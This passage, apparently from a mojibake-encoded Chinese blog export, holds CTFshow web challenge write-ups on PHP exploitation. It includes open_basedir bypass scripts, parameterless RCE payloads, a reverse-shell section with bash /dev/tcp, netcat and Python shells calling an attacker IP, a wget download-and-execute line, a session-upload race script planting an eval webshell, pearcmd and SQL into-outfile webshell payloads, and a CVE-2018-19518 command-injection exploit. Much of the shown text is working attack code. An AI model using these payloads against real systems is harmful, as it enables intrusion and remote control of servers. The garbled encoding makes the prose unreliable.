//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering();\n// pharç”Ÿæˆ\n\n?>\n```\n\nä¸Šä¼ pharåè®®è¯»å–å°±è¡Œ\n\n**805**\n\n### open_basedirç»•è¿‡\n\n> open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚\n>\n> å‡è®¾open_basedir=/var/www/html/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚\n>\n> æ³¨æ„ï¼šç”¨open_basediræŒ‡å®šçš„**é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å**ã€‚\n>\n> æ–‡ç« æ¥è‡ª[è¿™é‡Œ](https://www.cnblogs.com/hookjoy/p/12846164.html)\n\nä½†æ˜¯è¿™ä¸ªé…ç½®å¯¹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œæ¯”å¦‚æ‰§è¡Œ`system('ls /')`çš„æ—¶å€™å°±ä¸å—é™åˆ¶ï¼Œ~~ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šè¢«banæ‰~~\n\nä¸‹é¢å°±æ˜¯ä¸€äº›bypassæ–¹æ³•\n\n1. globåè®®ï¼Œåªèƒ½æææ–‡ä»¶å\n\n   ```\n     $a = \"glob:///*\";\n     if ( $b = opendir($a) ) {\n       while ( ($file = readdir($b)) !== false ) {\n         echo $file.\"\\n\";\n       }\n       closedir($b);\n     }\n   ```\n\n2. åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass\n\n   åŸç†åœ¨è¿™é‡Œ\n\n   ```\n   mkdir(\"s\");\n   chdir('s');\n   ini_set('open_basedir','..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   ini_set('open_basedir','/');\n   echo file_get_contents(\"/ctfshowflag\");\n   ```\n\n3. åˆ©ç”¨bindtextdomain()å‡½æ•°Bypass\n\n   è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½æææ–‡ä»¶å\n\n   > **bindtextdomain()å‡½æ•°**\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > bindtextdomain()å‡½æ•°ç”¨äºç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚\n   >\n   > ```\n   > bindtextdomain ( string $domain , string $directory ) : string\n   > ```\n   >\n   > bindtextdomain()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°$directoryæ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå®ƒä¼šåœ¨$directoryå­˜åœ¨çš„æ—¶å€™è¿”å›$directoryï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚\n\n   æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹directoryå‚æ•°æ ¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨\n\n4. åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•Bypass\n\n   è¿™ä¸ªå’Œä¸Šé¢é‚£ä¸ªå¾ˆç›¸ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºæŠ¥é”™ï¼Œç›´æ¥ç»™payloadå§\n\n   ```\n   <?php\n   echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';\n   $info = new SplFileInfo($_GET['dir']);\n   var_dump($info->getRealPath());\n   ?>\n   ```\n\n5. åˆ©ç”¨realpath()å‡½æ•°Bypass\n\n   > ### realpath()å‡½æ•°\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > realpath â€” è¿”å›è§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„åã€‚å®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚\n   >\n   > å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š\n   >\n   > ```\n   > realpath ( string $path ) : string\n   > ```\n   >\n   > ### Bypass\n   >\n   > ç¯å¢ƒæ¡ä»¶ï¼šWindows\n   >\n   > åŸºæœ¬åŸç†æ˜¯åŸºäºæŠ¥é”™è¿”å›å†…å®¹çš„ä¸ç”¨ï¼Œè®¾ç½®è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¾ªç¯éå†åŒ¹é…åˆ°æ­£åˆ™çš„æŠ¥é”™ä¿¡æ¯çš„å­—ç¬¦æ¥é€ä¸ªæ‹¼æ¥æˆå­˜åœ¨çš„æ–‡ä»¶åï¼Œå¦å¤–æ˜¯éœ€è¦ç»“åˆåˆ©ç”¨Windowsä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„é€šé…ç¬¦<å’Œ>ï¼Œä¸ç„¶åªèƒ½è¿›è¡Œæš´ç ´ã€‚\n\n   ```\n   <?php\n   ini_set('open_basedir', dirname(__FILE__));\n   printf(\"<b>open_basedir: %s</b><br />\", ini_get('open_basedir'));\n   set_error_handler('isexists');\n   $dir = 'E:/wamp64/';\n   $file = '';\n   $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\n   for ($i=0; $i < strlen($chars); $i++) {\n           $file = $dir . $chars[$i] . '<><';\n           realpath($file);\n   }\n   function isexists($errno, $errstr)\n   {\n           $regexp = '/File\\((.*)\\) is not within/';\n           preg_match($regexp, $errstr, $matches);\n           if (isset($matches[1])) {\n                   printf(\"%s <br/>\", $matches[1]);\n           }\n   }\n   ?>\n   ```\n\n   å¯ä»¥çœ‹åˆ°ï¼Œé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶å°±è¢«åˆ—å‡ºæ¥äº†ï¼Œé¦–å­—æ¯ç›¸åŒçš„æ–‡ä»¶ä¸­åªåˆ—äº†ç¬¬ä¸€ä¸ªï¼š\n\n   ![img](https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png)\n\næœ€åæ˜¯å¤§ä½¬è„šæœ¬\n\n```\n<?php\n/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/\nheader('content-type: text/plain');\nerror_reporting(-1);\nini_set('display_errors', TRUE);\nprintf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());\nprintf(\"disable_functions: %s\\n\", ini_get('disable_functions'));\n$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');\n$relat_file = getRelativePath(__FILE__, $file);\n$paths = explode('/', $file);\n$name = mt_rand() % 999;\n$exp = getRandStr();\nmkdir($name);\nchdir($name);\nfor($i = 1 ; $i < count($paths) - 1 ; $i++){\n    mkdir($paths[$i]);\n    chdir($paths[$i]);\n}\nmkdir($paths[$i]);\nfor ($i -= 1; $i > 0; $i--) { \n    chdir('..');\n}\n$paths = explode('/', $relat_file);\n$j = 0;\nfor ($i = 0; $paths[$i] == '..'; $i++) { \n    mkdir($name);\n    chdir($name);\n    $j++;\n}\nfor ($i = 0; $i <= $j; $i++) { \n    chdir('..');\n}\n$tmp = array_fill(0, $j + 1, $name);\nsymlink(implode('/', $tmp), 'tmplink');\n$tmp = array_fill(0, $j, '..');\nsymlink('tmplink/' . implode('/', $tmp) . $file, $exp);\nunlink('tmplink');\nmkdir('tmplink');\ndelfile($name);\n$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\";\n$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";\necho \"\\n-----------------content---------------\\n\\n\";\necho file_get_contents($exp);\ndelfile('tmplink');\n\nfunction getRelativePath($from, $to) {\n  // some compatibility fixes for Windows paths\n  $from = rtrim($from, '\\/') . '/';\n  $from = str_replace('\\\\', '/', $from);\n  $to   = str_replace('\\\\', '/', $to);\n\n  $from   = explode('/', $from);\n  $to     = explode('/', $to);\n  $relPath  = $to;\n\n  foreach($from as $depth => $dir) {\n    // find first non-matching dir\n    if($dir === $to[$depth]) {\n      // ignore this directory\n      array_shift($relPath);\n    } else {\n      // get number of remaining dirs to $from\n      $remaining = count($from) - $depth;\n      if($remaining > 1) {\n        // add traversals up to first matching dir\n        $padLength = (count($relPath) + $remaining - 1) * -1;\n        $relPath = array_pad($relPath, $padLength, '..');\n        break;\n      } else {\n        $relPath[0] = './' . $relPath[0];\n      }\n    }\n  }\n  return implode('/', $relPath);\n}\n\nfunction delfile($deldir){\n    if (@is_file($deldir)) {\n        @chmod($deldir,0777);\n        return @unlink($deldir);\n    }else if(@is_dir($deldir)){\n        if(($mydir = @opendir($deldir)) == NULL) return false;\n        while(false !== ($file = @readdir($mydir)))\n        {\n            $name = File_Str($deldir.'/'.$file);\n            if(($file!='.') && ($file!='..')){delfile($name);}\n        } \n        @closedir($mydir);\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? true : false;\n    }\n}\n\nfunction File_Str($string)\n{\n    return str_replace('//','/',str_replace('\\\\','/',$string));\n}\n\nfunction getRandStr($length = 6) {\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $randStr = '';\n    for ($i = 0; $i < $length; $i++) {\n        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);\n    }\n    return $randStr;\n}\n```\n\nincludeè¿œç¨‹æ–‡ä»¶åä¼ å‚fileå³å¯\n\n**806**\n\n### phpæ— å‚RCE\n\né¦–å…ˆæ˜¯ä¸€ç¯‡å¯ä¾›å‚è€ƒçš„[æ–‡ç« ](https://blog.csdn.net/qq_45570082/article/details/106602261)\n\nåˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§\n\n1. **åˆ©ç”¨session_id**\n\n   phpä¸­æœ‰ä¸€ä¸ªå‡½æ•°å«session_id(),å¯ä»¥ç›´æ¥è·å–åˆ°cookieä¸­çš„phpsessionidå€¼ï¼Œphpsessionidçš„ç»„æˆç¬¦å·æœ‰é™å®š,ä¸èƒ½ä½¿ç”¨ â€™ () 'ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç„¶åå†é€šè¿‡hex2binå‡½æ•°è½¬æ¢å›å»ï¼Œ`bin2hex('payload');`æ¥è½¬æ¢16ç¦æ­¢ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡`eval(hex2bin(session_id(session_start())));`ï¼Œåœ¨åŠ ä¸Šè¯·æ±‚å¤´ä¸­Cookieä¸­çš„`PHPSESSID=16è¿›åˆ¶payload`æ‰§è¡Œ\n\n2. **åˆ©ç”¨`get_defined_vars ()`å‡½æ•°**\n\n   `get_defined_vars()`ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„\n\n   å¯ä¾›åˆ©ç”¨çš„å‡½æ•°\n\n   ```\n   end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚\n   ```\n\n   å¯ä»¥çœ‹åˆ°åœ¨å·²å®šä¹‰çš„å˜é‡ä¸­å­˜åœ¨ç€å…¨å±€å˜é‡GETå’ŒPOSTï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°æ¥å®ç°RCE\n\n   ```\n   payload:?a=eval(end(current(get_defined_vars())));&b=phpinfo();\n   ```\n\n3. æ–‡ä»¶è¯»å–\n\n   å¯ä¾›åˆ©ç”¨çš„å‡½æ•°\n\n   ```\n   var_dump()  æ‰“å°æ‰€æœ‰å†…å®¹\n   print_r()  åŒä¸Š\n   scandir()  æ‰«æè·¯å¾„å†…æ–‡ä»¶åå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨\n   localeconv()  \n   getcwd()  è·å¾—å½“å‰å·¥ä½œç›®å½•\n   getallheaders()  è·å¾—è¯·æ±‚å¤´å†…å®¹\n   \n   ```\n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n**807**\n\n### åå¼¹shell\n\næœ¬åœ°ç›‘å¬ç«¯å£ï¼Œè®°ä½è¦æœ‰å…¬ç½‘IPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨frpå†…ç½‘ç©¿é€\n\n1. å…¬ç½‘æœåŠ¡å™¨\n\n   ç›‘å¬å‘½ä»¤\n\n   ```\n   æ”»å‡»ç«¯\n   nc -lvp ç›‘å¬çš„ç«¯å£\n   å—å®³ç«¯\n   bash -i >& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0>&1\n   nc æ”»å‡»ç«¯IP æ”»å‡»ç«¯ç›‘å¬ç«¯å£ -t /bin/bash\n   ```\n\n   åˆ©ç”¨wgetä¸‹è½½æ‰§è¡Œ\n\n   ```\n   wget æ”»å‡»ç«¯IP/shell.txt -O /tmp/shell.php && php /tmp/shell.php\n   ```\n\n   pythonè„šæœ¬åå¼¹\n\n   ```\n   #!/usr/bin/python\n   #-*- coding: utf-8 -*-\n   import socket,subprocess,os\n   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n   s.connect((\"æ”»å‡»ç«¯IP\",æ”»å‡»ç«¯ç›‘å¬ç«¯å£)) #æ›´æ”¹localhostä¸ºâ¾ƒâ¼°çš„å¤–â½¹ip,ç«¯â¼ä»»æ„\n   os.dup2(s.fileno(),0)\n   os.dup2(s.fileno(),1)\n   os.dup2(s.fileno(),2)\n   p=subprocess.call([\"/bin/sh\",\"-i\"])\n   \n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**808**\n\n### å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«\n\n```\nimport requests\nimport threading\nimport sys\nsession=requests.session()\nsess='yu22x'\nurl1=\"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/\"\nurl2='http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'\ndata1={\n    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'\n}\ndata2={\n    '1':'echo 11123;system(\"cat /*\");',\n}\nfile={\n    'file':'1'\n}\ncookies={\n    'PHPSESSID': sess\n}\ndef write():\n    while True:\n        r = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n    while True:\n        r = session.post(url2,data=data2)\n        if '11123' in r.text:\n            print(r.text)\n\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in range(1,30): \n            threading.Thread(target=write).start()\n        for i in range(1,30):\n            threading.Thread(target=read).start()\n    event.set()\n```\n\nçº¯çº¯çœ‹è¿æ°”\n\n**809**\n\n### pearæ–‡ä»¶åŒ…å«/RCE\n\næ–‡ç« [åœ¨æ­¤](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)\n\n> peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š`--with-pear`æ‰ä¼šå®‰è£…ã€‚\n>\n> ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨`/usr/local/lib/php`ã€‚\n>\n> åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚\n>\n> æˆ‘æœ€æ—©çš„æ—¶å€™æ˜¯åœ¨é˜…è¯»phpinfo()çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Dockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯`register_argc_argv`è¿™ä¸ªé…ç½®ã€‚æ–‡æ¡£ä¸­å¯¹è¿™ä¸ªé€‰é¡¹çš„ä»‹ç»ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯ï¼Œå½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™`$argc`ã€`$argv`ã€`$_SERVER['argv']`å‡ ä¸ªå˜é‡ã€‚\n>\n> å¦‚æœPHPä»¥å‘½ä»¤è¡Œçš„å½¢å¼è¿è¡Œï¼ˆå³sapiæ˜¯cliï¼‰ï¼Œè¿™é‡Œå¾ˆå¥½ç†è§£ã€‚ä½†å¦‚æœPHPä»¥Serverçš„å½¢å¼è¿è¡Œï¼Œä¸”åˆå¼€å¯äº†`register_argc_argv`ï¼Œé‚£ä¹ˆè¿™å…¶ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Ÿ\n>\n> HTTPæ•°æ®åŒ…ä¸­çš„query-stringä¼šè¢«ä½œä¸ºargvçš„å€¼\n\næœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php\n```\n\næ­¤æ—¶/tmp/hello.phpæ–‡ä»¶ä¸­å°±æœ‰äº†æˆ‘ä»¬å†™å…¥çš„`<?=phpinfo()?>`ï¼Œæ–‡ä»¶åŒ…å«å³å¯\n\n**810**\n\n### SSRFæ‰“PHP-FPM\n\næœ‰å·¥å…·ä¸ç”¨***\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206081711243.png)\n\nè®°å¾—ä¼ å…¥çš„æ—¶å€™urlç¼–ç ä¸€ä¸‹\n\n**811**\n\n### file_put_contentsæ‰“PHP-FPM\n\næ–‡ç« åœ¨[è¿™é‡Œ](https://blog.csdn.net/sdst_/article/details/118080811)\n\nç”¨çš„yu22xå¸ˆå‚…çš„è„šæœ¬\n\n1. ä¼ªé€ ftpæœåŠ¡å™¨\n\n   ```python\n   import socket\n   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   s.bind(('0.0.0.0',4566)) #ç«¯å£å¯æ”¹\n   s.listen(1)\n   conn, addr = s.accept()\n   conn.send(b'220 welcome\\n')\n   #Service ready for new user.\n   #Client send anonymous username\n   #USER anonymous\n   conn.send(b'331 Please specify the password.\\n')\n   #User name okay, need password.\n   #Client send anonymous password.\n   #PASS anonymous\n   conn.send(b'230 Login successful.\\n')\n   #User logged in, proceed. Logged out if appropriate.\n   #TYPE I\n   conn.send(b'200 Switching to Binary mode.\\n')\n   #Size /\n   conn.send(b'550 Could not get the file size.\\n')\n   #EPSV (1)\n   conn.send(b'150 ok\\n')\n   #PASV\n   conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n') #STOR / (2)\n   conn.send(b'150 Permission denied.\\n')\n   #QUIT\n   conn.send(b'221 Goodbye.\\n')\n   conn.close()\n   ```\n\n2. gopherusç”Ÿæˆpayload\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206082140193.png)\n\n3. vpsç›‘å¬ä¼ å‚\n\n   ```\n   file=ftp://x.x.x.x:4566&content=gopherusç”Ÿæˆçš„payload(åªå–ä¸‹åˆ’çº¿åé¢çš„å†…å®¹ï¼Œä¸”ä¸éœ€è¦å†æ¬¡ç¼–ç )\n   ```\n\n**812**\n\n### PHP-FPMæœªæˆæƒ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"CTFshowå…¶ä»–","url":"/posts/6352d546.html","content":"\n**396**\n\n`parse_url`å‡½æ•°å°†ä¸€ä¸ªurlæ‹†åˆ†ä¸ºå¦‚ä¸‹å½¢å¼\n\n![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://img-blog.csdnimg.cn/20210628090124739.png)\n\næ— éœ€ç»•è¿‡ï¼Œç›´æ¥æ„é€ \n\n```\npayload:?url=http://l/l;cat fl0g* >1.txt\n```\n\n**397**\n\nåŠ äº†ä¸ª/tmpä¹Ÿæ²¡å•¥åµç”¨ï¼ŒåŒä¸Šå³å¯\n\n**398**\n\nåœ¨hostå¤„åŠ äº†/;è¿‡æ»¤ï¼Œä¹Ÿæ²¡å•¥ç”¨\n\n**399**\n\nä¸ºå•¥è·Ÿhostè¿‡ä¸å»å•Šï¼Œå¤šæ»¤äº†ä¸ª>\n\n**400**\n\nè¿‡æ»¤httpä¹Ÿæ²¡ç”¨\n\n**401**\n\nåŒä¸Š\n\n**402**\n\nåœ¨schemeå¤„è¿‡æ»¤httpï¼Œæ¢ä¸ªåè®®å°±è¡Œ\n\n**403**\n\n```\nif(preg_match('/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/', $url['host'])){ \n        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']); \n    } \n```\n\nè¿™é‡ŒåŒ¹é…äº†ä¸€ä¸ªipåœ°å€ï¼Œä¸Šé¢payloadæ”¹ä¸€ä¸‹å°±è¡Œ\n\n**405**\n\n```php\nif(preg_match('/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./', $url['host'])){\n\tif(preg_match('/^\\/[A-Za-z0-9]+$/', $url['path'])){\n\t\tif(preg_match('/\\~|\\.|php/', $url['scheme'])){\n\t\t\tshell_exec('curl '.$url['scheme'].$url['host'].$url['path']);\n\t\t\t}\n\t\t}\n}\n```\n\nç¬¬ä¸€ä¸ªåœ¨hostä¸­åŒ¹é…IPåœ°å€ï¼Œç¬¬äºŒä¸ªpathä¸èƒ½æœ‰å­—æ¯æ•°å­—ï¼Œç¬¬ä¸‰ä¸ªåè®®ä¸­éœ€è¦æœ‰php\n\næœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:?url=php://127.0.0.1;cat fl0g.php> 1.txt;11/a\n```\n\n**406**\n\n`filter_var`å‡½æ•°[ç¼ºé™·](https://www.cnblogs.com/lxfweb/p/13757525.html)\n\nè¿™é‡Œè¿‡æ»¤å™¨åœ¨éªŒè¯urlçš„åˆæ³•æ€§\n\n```\n?url=0://www.baidu.com;'union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/\"/var/www/html/4.php\"%23\n```\n\nè®¿é—®4.phpåè®¿é—®1.txtå³å¯\n"},{"title":"CTFshowphpCVE","url":"/posts/85a6a528.html","content":"\n**311**\n\nPHPç‰ˆæœ¬7.1.33dev\n\nCVE-2019-11043\n\n[åˆ©ç”¨è„šæœ¬](https://github.com/neex/phuip-fpizdam)\n\n**312**\n\nPHPç‰ˆæœ¬5.6.38\n\nCVE-2018-19518\n\næ¼æ´æˆå› \n\n> IMAPåè®®ï¼ˆå› ç‰¹ç½‘æ¶ˆæ¯è®¿é—®åè®®ï¼‰å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯é‚®ä»¶å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¿™ç§åè®®ä»é‚®ä»¶æœåŠ¡å™¨ä¸Šè·å–é‚®ä»¶çš„ä¿¡æ¯ï¼Œä¸‹è½½é‚®ä»¶ç­‰ã€‚å®ƒè¿è¡Œåœ¨TCP/IPåè®®ä¹‹ä¸Šï¼Œä½¿ç”¨çš„ç«¯å£æ˜¯143ã€‚åœ¨phpä¸­è°ƒç”¨çš„æ˜¯imap_openå‡½æ•°\n>\n> `imap_open( string $mailbox,string $user,string $passwordï¼‰`\n>\n> å…¶ä¸­å‚æ•°mailbox,æ˜¯ç”¨æ¥è¿æ¥é‚®ç®±æœåŠ¡å™¨çš„ã€‚å®ƒä¼šè°ƒç”¨rshæ¥è¿æ¥è¿œç¨‹shellè€Œï¼Œdebian/ubuntuä¸­é»˜è®¤ä½¿ç”¨sshæ¥ä»£æ›¿rshï¼Œåˆå› ä¸ºsshå‘½ä»¤ä¸­å¯ä»¥é€šè¿‡è®¾ç½®`-oProxyCommand=`æ¥è°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤ï¼Œæ‰€ä»¥æ”»å‡»è€…é€šè¿‡æ³¨å…¥è¿™ä¸ªå‚æ•°ï¼Œæœ€ç»ˆå°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚\n\nç„¶åå¯¹è‡ªå·±æƒ³è¦å‘çš„å†…å®¹è¿›è¡Œä¸€æ¬¡base64ç¼–ç \n\né¦–å…ˆå¯¹`<?php @eval($_POST[kkk]);?>`è¿›è¡Œä¸€æ¬¡base64ç¼–ç \n\nç„¶åå¯¹`echo \"ä¸Šä¸ªç¼–ç å†…å®¹\" | base64 -d >shell.php`è¿›è¡Œä¸€æ¬¡base64ç¼–ç \n\næ³¨æ„ï¼šå¦‚æœè¿›è¡Œbase64ç¼–ç åï¼Œå«æœ‰+ =ï¼Œéƒ½è¦è¿›è¡Œurlç¼–ç å³%2b %3dï¼Œæ‰€ä»¥ä¸ºäº†ä¿è¯ä¸ä¼šå‡ºé”™ï¼Œæœ€å¥½å†å¯¹å¾—åˆ°çš„base64ç¼–ç åçš„å­—ç¬¦ä¸²å†è¿›è¡Œurlç¼–ç ã€‚ç›¸å½“äºæ­¥éª¤ä¸ºå…ˆbase64ç¼–ç ï¼Œå†urlç¼–ç \n\nç„¶åå°†hostnameçš„å†…å®¹æ›¿æ¢æˆ`x+-oProxyCommand%3decho%09ç¼–ç åçš„å†…å®¹|base64%09-d|sh}`\n\n```\nhostname=x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzJ0cmExMHBPejgrInxiYXNlNjQgLWQgPnNoZWxsLnBocA==|base64%09-d|sh}&username=1&password=1\n```\n\n**313**\n\nPHPç‰ˆæœ¬5.4.1\n\nCVE-2012-1823\n\nè¯¥æ¼æ´å…·ä½“æˆå› å¯è§[Pç¥åšå®¢](https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html)\n\n> å‘½ä»¤è¡Œå‚æ•°ä¸å…‰å¯ä»¥é€šè¿‡`#!/usr/local/bin/php-cgi -d include_path=/path`çš„æ–¹å¼ä¼ å…¥php-cgiï¼Œæ›´å¯ä»¥é€šè¿‡querystringçš„æ–¹å¼ä¼ å…¥ã€‚\n>\n> é€šè¿‡é˜…è¯»æºç ï¼Œæˆ‘å‘ç°cgiæ¨¡å¼ä¸‹æœ‰å¦‚ä¸‹ä¸€äº›å‚æ•°å¯ç”¨ï¼š\n>\n> - `-c` æŒ‡å®šphp.iniæ–‡ä»¶çš„ä½ç½®\n> - `-n` ä¸è¦åŠ 